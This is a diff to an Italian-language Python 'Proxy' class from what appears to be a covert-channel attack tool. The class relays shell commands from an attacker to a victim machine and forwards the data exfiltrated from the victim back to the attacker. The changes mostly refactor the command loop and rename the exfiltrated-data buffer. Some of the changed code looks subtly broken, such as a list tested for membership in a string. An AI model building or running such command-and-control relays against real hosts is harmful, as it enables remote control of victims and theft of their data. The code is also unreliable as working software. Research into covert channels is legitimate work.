@@ -222,17 +222,16 @@ class Proxy:
             if not is_ipaddress(self.ip_vittima):
                 raise TypeError("ip_vittima non valido") 
             print(f"IP VITTIMA",self.ip_vittima) 
-        
         #-------------------------- 
         if not is_ipaddress(ip_attaccante): 
             raise TypeError("Indirizzo IP attaccante non valido")  
         if not is_integer(proxy_port): 
-            raise TypeError("Porta non valida")  
+            raise TypeError("Porta non valida") 
         self.proxy_port=proxy_port
         self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
         self.ip_vittima:ipaddress.IPv4Address=None 
         self.ip_host:ipaddress.IPv4Address=None 
-        self.data_received:list=[] 
+        self.exfiltred_data:list=[] 
         self.attack_function:ATTACK_TYPE=None  
         while not is_ipaddress(self.ip_host): 
             self.ip_host=get_ip_host() 
@@ -373,8 +372,10 @@ class Proxy:
             #FIREWALL.disable() 
             print("Controllo connesisone con attaccante")
             connessione_attaccante() 
+            if not is_socket(self.socket_attacker) and not attacker_mode: 
+                raise TypeError("socket non valido",self.socket_attacker)
             print("Connessione con attaccante stabilita") 
-            print("Controllo connesisone con vittima")
+            print("Controllo connessione con vittima")
             connessione_vittima() 
             print("Waiting command from attacker...")
             self.comando_from_attaccante()  
@@ -385,10 +386,22 @@ class Proxy:
             #FIREWALL.enable() 
         
     def comando_from_attaccante(self): 
-        def IF_attacker_mode(): 
-            msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
-            command=input(msg)  
-            return MSG.CONFIRM_COMMAND.value+command 
+        def get_command(): 
+            if attacker_mode: 
+                msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
+                command=input(msg)  
+                received_data=MSG.CONFIRM_COMMAND.value+command 
+            else: 
+                received_data=""
+                while True:
+                    self.socket_attacker.settimeout(10) 
+                    chunk=self.socket_attacker.recv(1024).decode() 
+                    if not chunk: break
+                    received_data+=chunk
+                    if MSG.END_SOCKETSEND.value in received_data: 
+                        received_data=received_data.replace(MSG.END_SOCKETSEND.value,"")
+                        break 
+            return received_data
         def end_communication_wth_victim():
             if not is_ipaddress(self.ip_vittima):
                 raise Exception(f"ip_vittima non validi ipaddress") 
@@ -401,68 +414,45 @@ class Proxy:
             ).send_data(data.encode(), self.ip_vittima) 
             print("VITTIMA AGGIORNATA") 
         def inoltra_dati(): 
-            if not is_list(self.data_received):
-                raise Exception(f"Argomenti non validi: {type(self.data_received)}") 
-            print(f"DATI RICEVUTI",self.data_received) 
-            for data in self.data_received:
-                print("INOLTRO",data) 
-                if attacker_mode: 
-                    continue
+            if not is_list(self.exfiltred_data) or len(self.exfiltred_data)<=0: 
+                print("Nessun dato ricevuto") 
+                self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) if not attacker_mode else None
+                raise Exception(f"Lista dati esfiltrati non valida:",type(self.exfiltred_data),self.exfiltred_data)  
+            if attacker_mode: 
+                return 
+            for data in self.exfiltred_data:
                 try: 
+                    print("Inoltro:",data)  
                     if not is_bytes(data): 
                         data=bytes(data) 
-                except Exception as e: 
-                    print("Conversione non riuscita",e) 
-                    continue
-                try: 
                     self.socket_attacker.sendall(data) 
+                except Exception as e: 
+                    print("Conversione non riuscita",e)  
                 except Exception as e:
                     print("Invio dati non riuscito",e) 
-            print("INVIO LAST_PACKET")
-            if attacker_mode: 
-                pass
-            else: self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode())
-            print("DATI INOLTRATI") 
+            self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) 
+        def reset(): 
+            nonlocal received_command
+            received_command=None
         #---------------------------
-        if not is_socket(self.socket_attacker): 
-            if attacker_mode: 
-                print("ATACKER_MODE->connessione_vittima\tsocket_attacker")
-            else: raise TypeError("socket non valido",self.socket_attacker)
-        if not is_ipaddress(self.ip_vittima): 
-            raise TypeError("ip_vittima non ipaddress") 
-        if not is_ipaddress(self.ip_host): 
-            raise TypeError("ip_host non ipaddress")  
-        if not is_enum_member(self.attack_function,ATTACK_TYPE): 
-            raise TypeError("attack_function non ATTACK_TYPE") 
-        if not is_list(self.data_received): 
-            raise TypeError("data_received non lista")  
-        
         wait_class=ReceiveSingleton(self.attack_function).wait_class
         if not isinstance(wait_class, _IPx):  
             raise TypeError("wait_class non _IPx",type(wait_class)) 
-        print("WAIT CLASS",type(wait_class)) 
         while True: 
-            if attacker_mode: 
-                socket_data=IF_attacker_mode() 
-            else: socket_data=self.socket_attacker.recv(1024).decode()  
-            print("RECEIVED COMMAND", socket_data) 
-            if not is_string(socket_data): 
-                print("socket_data not string",type(socket_data) )
-                break 
-            if any(case in socket_data for case in exit_cases): 
-                print("socket_data in exit_cases",socket_data)
-                break 
-            if MSG.END_COMMUNICATION.value in socket_data: 
-                print("END_COMMUNICATION in socket_data",socket_data)
-                break  
             thread_data=threading.Thread(target= lambda: wait_class.wait() ) 
             thread_data.start() 
+            received_command=get_command()  
+            if not is_string(received_command) or ([MSG.CONFIRM_COMMAND.value,MSG.WAIT_DATA.value] not in received_command):
+                print("Messaggio comando non valido")
+                continue
+            if any(case in received_command for case in exit_cases): 
+                print("received_command in exit_cases",received_command) 
+                break 
+            print("Received command:", received_command) 
             #data=wait_class.wait().data
-            print(f"Tramite {self.attack_function.name} aspetto che {self.ip_vittima} mandi i dati") 
-            #if comando is not None:
-            #   data=CONFIRM_COMMAND+comando 
-            if MSG.CONFIRM_COMMAND.value in socket_data:   
-                command= socket_data.replace(MSG.CONFIRM_COMMAND.value,"").strip()
+            print(f"Aspetto che {self.ip_vittima} mandi i dati con il Covert Channel {self.attack_function.name} ") 
+            if MSG.CONFIRM_COMMAND.value in received_command: 
+                command= received_command.replace(MSG.CONFIRM_COMMAND.value,"").strip()
                 print("COMANDO",command) 
                 SendSingleton(
                     self.attack_function, 
@@ -470,26 +460,18 @@ class Proxy:
                     use_delay 
                 ).send_data(command.encode(), self.ip_vittima) 
             elif MSG.WAIT_DATA.value in command:
-                print("ASPETTO I DATI")
-            else: print(f"COMMAND: caso non contemplato {command}")
+                print("Aspetto i dati dalla vittima")
+            else: 
+                print(f"Caso non contemplato {received_command}")
             if thread_data.ident is not None:
                 thread_data.join() 
-            self.data_received=[]  
-            self.data_received=wait_class.data 
-            print("DATA RECEIVED:",self.data_received)
-            if not is_list(self.data_received) or len(self.data_received)<=0:
-                print("NESSUN DATO") 
-                if attacker_mode: 
-                    print("ATTACKER MODE -> sending to attacker LAST PACKET")
-                else: self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) 
-            else:
-                inoltra_dati() 
-            socket_data=None
-        print("INTERRUZIONE PROGRAMMA") 
+            self.exfiltred_data=wait_class.data 
+            print("DATA RECEIVED:",self.exfiltred_data)
+            inoltra_dati() 
+            reset()
+        print("Interruzione programma") 
         end_communication_wth_victim() 
-        if attacker_mode: 
-            pass
-        else: self.socket_attacker.close()  
+        self.socket_attacker.close()  if not attacker_mode else None
         
 if __name__=="__main__": 
     args=ARGS_CONFIG.FROM_COMMAND(ENTITY.PROXY) 
